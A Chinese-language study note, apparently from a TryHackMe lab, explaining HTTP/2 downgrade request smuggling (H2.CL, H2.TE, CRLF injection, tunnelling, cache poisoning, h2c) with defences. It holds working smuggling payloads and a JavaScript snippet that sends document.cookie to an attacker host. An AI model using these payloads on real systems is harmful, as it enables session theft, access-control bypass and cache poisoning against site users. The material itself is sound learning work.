## 概述 (Overview)

HTTP/2 是 HTTP 协议的第二个主要版本，旨在通过二进制分帧、头部压缩、多路复用等特性提高性能和效率。理论上，HTTP/2 的明确边界定义使其能抵抗传统的基于 `Content-Length` 和 `Transfer-Encoding` 歧义的 HTTP/1.1 请求走私。然而，在特定场景下，尤其是当 HTTP/2 与 HTTP/1.1 系统（如反向代理和后端服务器）混合部署时，新的请求走私向量依然存在，有时甚至更容易被利用。

## HTTP/2 基础 (HTTP/2 Basics)

*   **二进制协议 (Binary Protocol):** 与文本描述的 HTTP/1.1 不同，HTTP/2 使用二进制帧进行数据传输，更易于机器解析且不易出错。
*   **请求组件 (Request Components):**
    *   **伪头部 (Pseudo-Headers):** 以冒号 `:` 开头，是 HTTP/2 请求必需的最小头部集，例如 `:method`, `:path`, `:scheme`, `:authority`。
    *   **常规头部 (Headers):** 类似于 HTTP/1.1 的头部，但 HTTP/2 要求头部名称为小写，如 `user-agent`, `content-length`。
    *   **请求体 (Request Body):** 与 HTTP/1.1 类似，包含 POST 参数、上传文件等数据。
*   **明确边界 (Clear Boundaries):** HTTP/2 为请求或响应的每个部分（如头部、数据帧）都定义了精确的大小字段。例如，每个头部帧都包含其名称和值的长度。请求体的大小也通过数据帧的长度明确指定。
*   **`Content-Length` 的角色:** 在纯 HTTP/2 环境中，`Content-Length` 头部是多余的，因为帧本身就带有长度信息。但浏览器通常仍会发送它，以兼容可能发生的 HTTP/2 到 HTTP/1.1 降级。

## HTTP/2 请求走私与降级 (HTTP/2 Request Smuggling & Downgrade)

### 请求走私的核心原因 (Core Reason for Smuggling in HTTP/2 Context)

尽管 HTTP/2 自身设计避免了 HTTP/1.1 中的边界歧义，但当 HTTP/2 请求被代理服务器（前端）转换为 HTTP/1.1 请求发送给后端服务器时（称为 **HTTP/2 降级**），走私的机会重新出现。问题源于转换过程中的不一致或漏洞。

*   **HTTP/2 降级 (HTTP/2 Downgrade):** 指前端服务器（如反向代理）与客户端之间使用 HTTP/2 通信，而与后端服务器之间使用 HTTP/1.1 通信的场景。
*   **攻击目标:** 攻击者发送精心构造的 HTTP/2 请求到前端，旨在影响其转换成的 HTTP/1.1 请求，从而在后端连接上造成 HTTP 不同步 (desynchronization)。

### 预期行为 (Expected Behavior in Downgrade)

一个正常的 HTTP/2 到 HTTP/1.1 转换过程：

*   **发送 (HTTP/2):**
    ```
    :method POST
    :path /
    :scheme https
    :authority tryhackme.com
    user-agent Mozilla/5.0
    content-length 15
    username=jsmith
    ```
*   **代理转换为 HTTP/1.1 并发送给后端:**
    ```
    POST / HTTP/1.1
    User-Agent: Mozilla/5.0
    Content-Length: 15
    Host: tryhackme.com

    username=jsmith
    ```
    注意 `Host` 头部通常由 `:authority` 伪头部生成。`content-length` 被传递以确保 HTTP/1.1 后端正确处理请求体。

## HTTP/2 请求走私技术 (HTTP/2 Smuggling Techniques)

这些技术利用了 HTTP/2 降级过程中，前端代理如何处理和转换 HTTP/2 请求中的特定头部或特性。

### H2.CL: 利用 `Content-Length` (Exploiting `Content-Length`)

*   **原理:**
    *   `Content-Length` 对纯 HTTP/2 无意义，但攻击者可以在 HTTP/2 请求中包含一个 `content-length` 头部。
    *   如果前端代理在降级时，不经验证或错误地将此 `content-length` 头部传递给 HTTP/1.1 后端。
    *   攻击者可以设置一个与 HTTP/2 请求体实际长度不符的 `content-length` 值（例如 `0`），欺骗后端服务器。
*   **利用方法:**
    1.  攻击者发送一个 HTTP/2 `POST` 请求，包含 `content-length: 0` 头部，但实际请求体中带有恶意内容 (如 `HELLO`)。
    2.  前端代理将请求降级为 HTTP/1.1，并将 `Content-Length: 0` 传递给后端。
    3.  后端服务器根据 `Content-Length: 0` 认为这是一个没有正文的 POST 请求。
    4.  HTTP/2 请求的原始正文 (`HELLO`) 被遗留在后端 TCP 连接的缓冲区中。
    5.  当下一个用户的请求到达该连接时，`HELLO` 会被附加到其请求的开头，导致请求污染。
*   **示例 Payload (H2 请求):**
    ```
    :method POST
    :path /
    :scheme https
    :authority tryhackme.com
    user-agent Mozilla/5.0
    content-length 0  # 关键点
    HELLO             # 实际的HTTP/2请求体，将被走私
    ```
*   **后果 (后端看到):**
    第一个请求 (来自攻击者):
    ```
    POST / HTTP/1.1
    User-Agent: Mozilla/5.0
    Content-Length: 0
    Host: tryhackme.com

    # (无正文)
    ```
    残留在缓冲区: `HELLO`
    下一个用户请求 (例如 `GET /`):
    ```
    HELLOGET / HTTP/1.1  # 用户的请求被污染
    Host: tryhackme.com
    User-Agent: Mozilla/5.0
    ...
    ```

### H2.TE: 利用 `Transfer-Encoding` (Exploiting `Transfer-Encoding`)

*   **原理:** 类似于 H2.CL，攻击者在 HTTP/2 请求中包含一个 `transfer-encoding: chunked` 头部。
    *   如果前端代理在降级时，将此头部原样传递给 HTTP/1.1 后端。
    *   如果后端服务器优先处理 `Transfer-Encoding` 头部。
*   **利用方法:**
    1.  攻击者发送一个 HTTP/2 `POST` 请求，包含 `transfer-encoding: chunked` 头部。
    2.  HTTP/2 请求的实际正文被构造成一个分块编码的 HTTP/1.1 消息，其中第一个块大小为 `0`，后面跟着要走私的请求。
    3.  前端代理降级请求，并将 `Transfer-Encoding: chunked` 和构造的请求体传递给后端。
    4.  后端服务器看到 `Transfer-Encoding: chunked`，处理到第一个 `0` 大小的块，认为请求结束。
    5.  剩余的 HTTP/2 请求体内容（即走私的请求）毒害后端连接。
*   **示例 Payload (H2 请求):**
    ```
    :method POST
    :path /
    :scheme https
    :authority tryhackme.com
    user-agent Mozilla/5.0
    transfer-encoding chunked # 关键点

    0\r\n                     # HTTP/2请求体，模拟分块结束
    \r\n
    GET /other HTTP/1.1\r\n  # 走私的请求
    Foo: s
    ```
*   **后果 (后端看到):**
    第一个请求 (来自攻击者):
    ```
    POST / HTTP/1.1
    User-Agent: Mozilla/5.0
    Transfer-encoding: chunked
    Host: tryhackme.com

    0

    ```
    残留在缓冲区: `GET /other HTTP/1.1\r\nFoo: s` (假设其后还有内容或等待下一个请求补全)

### CRLF 注入 (CRLF Injection)

*   **原理:**
    *   CRLF (`\r\n`) 在 HTTP/1.1 中用作头部分隔符和头部与正文的分隔符。
    *   HTTP/2 允许在头部值中包含任意二进制数据，包括 `\r\n`。
    *   如果前端代理在降级时，未正确处理或过滤 HTTP/2 头部值中的 `\r\n`，直接将其传递到 HTTP/1.1 请求中。
    *   这会导致在生成的 HTTP/1.1 请求中注入新的头部，甚至注入一个完整的第二个请求。
*   **利用方法:**
    1.  攻击者在一个 HTTP/2 头部的值中（如自定义头部 `Foo`）注入 `\r\n` 和后续的 HTTP/1.1 头部或完整请求。
    2.  前端代理将此 HTTP/2 请求降级。如果 `\r\n` 未被处理，它们将在生成的 HTTP/1.1 请求中充当分隔符。
*   **示例 Payload (H2 请求):**
    ```
    :method POST
    :path /
    :scheme https
    :authority tryhackme.com
    user-agent Mozilla/5.0
    Foo bar\r\n                      # 注入CRLF
        Content-Length: 0\r\n         # 注入新头部
        \r\n                         # 注入空行，分隔头部与正文
        GET /other HTTP/1.1\r\n      # 注入走私的请求
        X: x
    ```
*   **后果 (后端看到):**
    ```
    POST / HTTP/1.1
    User-Agent: Mozilla/5.0
    Host: tryhackme.com
    Foo: bar                        # 原始头部
    Content-Length: 0               # 被注入的头部，使后端认为第一个请求无正文
                                    # 被注入的空行
    GET /other HTTP/1.1             # 被走私的请求
    X: x
    ```
*   **注意:** 注入点不限于头部值，也可能在路径或其他可控字段，取决于代理的具体实现。

## 请求隧道与失步 (Request Tunneling vs. Desynchronization)

*   **失步 (Desynchronization):** 如 H2.CL 和 H2.TE 示例，后端连接被污染，导致攻击者可以影响**其他用户**的请求。通常发生在后端服务器重用单个 TCP 连接处理多个用户请求的场景。
*   **请求隧道 (Request Tunneling):** 当每个用户有其独立的后端连接时，攻击者无法直接影响其他用户。但攻击者仍然可以向**自己的后端连接**走私请求。这种场景通常用于：
    *   绕过前端代理的访问控制限制。
    *   探测或泄露内部网络信息或代理添加的内部头部。
    *   进行 Web 缓存投毒。

## 利用场景与示例 (Exploitation Scenarios & Examples)

### 场景1: H2.CL 干扰其他用户 (THM 示例 - 强制点赞)

*   **漏洞:** 旧版 Varnish 代理，H2.CL 漏洞，后端共享连接。
*   **目标:** 强制其他用户喜欢攻击者的帖子。
*   **Payload (H2 请求):**
    ```
    :method POST
    :path /
    :scheme https
    :authority <target_ip>:<port>
    user-agent Mozilla/5.0
    content-length 0
    GET /post/like/<attacker_post_id> HTTP/1.1\r\n # 走私点赞请求
    X: f                                          # 任意填充，消耗下一个请求的请求行
    ```
*   **原理:**
    1.  前端代理看到 H2 POST 请求，降级后 `Content-Length: 0` 使后端认为第一个请求无正文。
    2.  走私的 `GET /post/like/...` 请求不完整，等待数据。
    3.  当受害者用户发送请求 (如 `GET / HTTP/1.1`) 时，其请求行 `GET / HTTP/1.1` 会被附加到 `X: f` 之后，形成 `X: fGET / HTTP/1.1`。
    4.  后端实际处理的是 `GET /post/like/<attacker_post_id> HTTP/1.1`，但使用的是受害者的 Cookie (因为受害者的头部被附加在了后面)。
*   **工具:** Burp Suite Repeater (确保取消勾选 "Update Content-Length"，并确认发送的是 HTTP/2 请求)。

### 场景2: 请求隧道 - 泄露内部头部 (THM 示例 - HAProxy CRLF)

*   **漏洞:** 旧版 HAProxy (CVE-2019-19330)，允许通过 CRLF 注入进行请求走私。后端应用程序 `/hello` 反射 `q` POST 参数。
*   **目标:** 泄露代理添加到后端请求中的内部头部 (如 `X-Internal-*`)。
*   **Payload (H2 请求，通过 `Foo` 头部注入):**
    ```
    :method POST
    :path /hello
    :scheme https
    :authority <target_ip>:<port>
    user-agent Mozilla Firefox
    Foo bar\r\n                                    # CRLF 注入点
        Content-Length: 0\r\n                      # 使第一个POST请求无正文
        Host: <target_ip>:<port>\r\n               # 为第一个请求提供Host
        \r\n
        POST /hello HTTP/1.1\r\n                   # 走私的第二个POST请求
        Content-Length: 300\r\n                    # 足够大的长度以捕获内部头部
        Host: <target_ip>:<port>\r\n
        Content-Type: application/x-www-form-urlencoded\r\n
        \r\n
        q=                                         # 反射点，内部头部会附加到这里
    ```
*   **原理:**
    1.  第一个 `POST /hello` (由H2请求转换而来) 由于注入的 `Content-Length: 0` 而无正文。
    2.  代理添加的 `Host` 和 `X-Internal-*` 头部会出现在这个第一个请求之后，但在走私的第二个 `POST /hello` 之前。
    3.  走私的第二个 `POST /hello` 的 `q=` 参数为空，此时，代理添加的那些内部头部（`Host: ...\r\n X-Internal-1: ...`）会被视为 `q` 参数的值的一部分。
    4.  后端应用将包含内部头部的 `q` 参数反射回来。
*   **执行:** 需要快速连续发送两次请求。第一次发送清空连接，第二次发送获取包含内部头部的响应。`Content-Length: 300` 需要调整。

### 场景3: 请求隧道 - 绕过前端限制 (THM 示例 - 访问 /admin)

*   **漏洞:** 同上 (HAProxy CRLF 注入)。
*   **目标:** 访问被前端代理禁止但后端允许的 `/admin` 路径。
*   **Payload (H2 请求):**
    ```
    :method POST
    :path /hello                     # 允许的路径
    :scheme https
    :authority <target_ip>:<port>
    user-agent Mozilla Firefox
    Foo bar\r\n
        Content-Length: 0\r\n
        Host: <target_ip>:<port>\r\n
        \r\n
        GET /admin HTTP/1.1\r\n      # 走私的请求，访问禁止路径
        X-Fake: a
    ```
*   **原理:**
    *   前端代理看到的是对允许路径 `/hello` 的请求，通过检查。
    *   由于 CRLF 注入和 `Content-Length: 0`，实际发送到后端的第一个请求是无正文的 `POST /hello`。
    *   随后走私的 `GET /admin` 请求被发送到后端并处理。
*   **注意:** 使用 `POST` 作为外层请求类型可能比 `GET` 更可靠，因为 `POST` 请求通常不会被缓存。

### 场景4: 请求隧道 - Web 缓存投毒 (THM 示例 - 窃取 Cookie)

*   **漏洞:** 同上 (HAProxy CRLF 注入)，代理配置了缓存。
*   **目标:** 毒害 `/static/text.js` 的缓存，使其返回包含恶意 JavaScript (窃取 Cookie) 的内容。
*   **步骤:**
    1.  **上传恶意JS:** 上传一个 `myjs.js` 文件到服务器允许的路径 (如 `/static/uploads/myjs.js`)，内容为窃取 Cookie 并发送到攻击者服务器的 JS 代码。
        ```javascript
        // myjs.js
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() { /* ... */ };
        xhttp.open("GET", "https://ATTACKER_IP:PORT/?c="+document.cookie, true);
        xhttp.send();
        ```
    2.  **构造投毒请求 (H2):**
        ```
        :method GET
        :path /static/text.js       # 目标缓存的URL
        :scheme https
        :authority <target_ip>:<port>
        user-agent Mozilla/5.0
        pragma no-cache             # 确保请求到达后端
        Foo bar\r\n
            Host: <target_ip>:<port>\r\n
            \r\n
            GET /static/uploads/myjs.js HTTP/1.1 # 走私的请求，获取恶意JS内容
        ```
    3.  **执行投毒:**
        *   **第一次发送投毒请求:** 后端会收到两个响应，第一个是 `/static/text.js` 的正常内容（被代理返回给攻击者），第二个是 `/static/uploads/myjs.js` 的内容（恶意JS，被代理排队）。
        *   **第二次发送普通请求 `GET /static/text.js` (H2 或 H1.1):** 代理会将排队的恶意JS内容作为 `/static/text.js` 的响应返回，并缓存此错误关联。
    4.  **受害者触发:** 当其他用户访问主页 `/` (加载 `/static/text.js`) 时，会从被污染的缓存中获取恶意JS，执行并发送 Cookie 给攻击者。
*   **接收 Cookie:** 攻击者需要一个 HTTPS 服务器来接收 Cookie (因为源站是 HTTPS)。可以使用 OpenSSL 生成证书和密钥，并用 Python `HTTPServer` 搭建。

## h2c 伪装 (h2c Smuggling / Cleartext HTTP/2 Upgrade Smuggling)

*   **h2c (HTTP/2 Cleartext):** 一种在非加密 (明文) TCP 连接上协商 HTTP/2 的机制。客户端发送一个带有 `Upgrade: h2c` 和 `HTTP2-Settings` 头部的 HTTP/1.1 请求。如果服务器支持，会响应 `101 Switching Protocols`，之后连接升级到 HTTP/2。
*   **现代浏览器通常不支持 h2c (安全原因)，但服务器可能仍支持。**
*   **h2c 伪装/隧道原理:**
    1.  当客户端（攻击者）向反向代理发送一个请求升级到 `h2c` 的 HTTP/1.1 请求时。
    2.  某些代理可能不处理这个升级请求，而是直接将其转发给后端服务器。
    3.  后端服务器执行升级，与客户端建立一个直接的 HTTP/2 通道。
    4.  此时，代理认为连接协议已更改（可能为非HTTP），不再检查后续通过此连接隧道传输的内容。
    5.  攻击者现在可以通过这个建立的 HTTP/2 隧道直接向后端发送任意 HTTP/2 请求，绕过代理的检查和限制。
*   **TLS 上的 h2c (Unusual Case):** 如果代理支持通过 TLS 的 HTTP/1.1，尝试在 TLS 通道上发送 `h2c` 升级请求。由于 `h2c` 规范上只用于明文，代理可能感到困惑而直接转发升级头，而不是自己处理。
*   **工具:** `h2csmuggler` (by BishopFox) 可以自动化此过程。
*   **利用场景 (THM 示例):** 绕过 HAProxy 对 `/private` 路径的访问限制。
    ```bash
    h2csmuggler -x https://<target_ip>:<port> -p /private # (大致命令)
    ```
    工具会先请求一个允许的路径 (如 `/`) 进行 `h2c` 升级，成功后通过建立的 HTTP/2 隧道请求被禁止的 `/private` 路径。

## 防御 HTTP/2 请求走私 (Defense Against HTTP/2 Smuggling)

1.  **及时更新代理和服务器软件:** 许多已知的 HTTP/2 走私漏洞已在较新版本中修复。
2.  **严格的协议转换:** 代理服务器在进行 HTTP/2 到 HTTP/1.1 转换时，必须严格验证和清理头部，丢弃或规范化不应传递的 HTTP/2 特定信息（如多余的 `Content-Length`，或正确处理注入的 `Transfer-Encoding`）。
3.  **正确处理头部中的控制字符:** 对于 CRLF 注入，代理应剥离或拒绝包含非法控制字符（如 `\r\n`）的 HTTP/2 头部值，或在转换为 HTTP/1.1 时对其进行编码。
4.  **禁用或正确处理 h2c:** 如果不需要，禁用 `h2c` 支持。如果需要，确保代理正确处理 `h2c` 升级请求，而不是盲目转发。
5.  **端到端 HTTP/2:** 如果可能，在整个请求链（客户端 -> 代理 -> 后端）都使用 HTTP/2，避免降级。
6.  **WAF/IDS 规则:** 更新 WAF/IDS 规则以检测已知的 HTTP/2 走私模式，但这通常是对特定漏洞的反应性措施。
7.  **纵深防御:** 不要仅依赖前端代理进行安全控制，后端应用也应有自己的验证和授权机制。
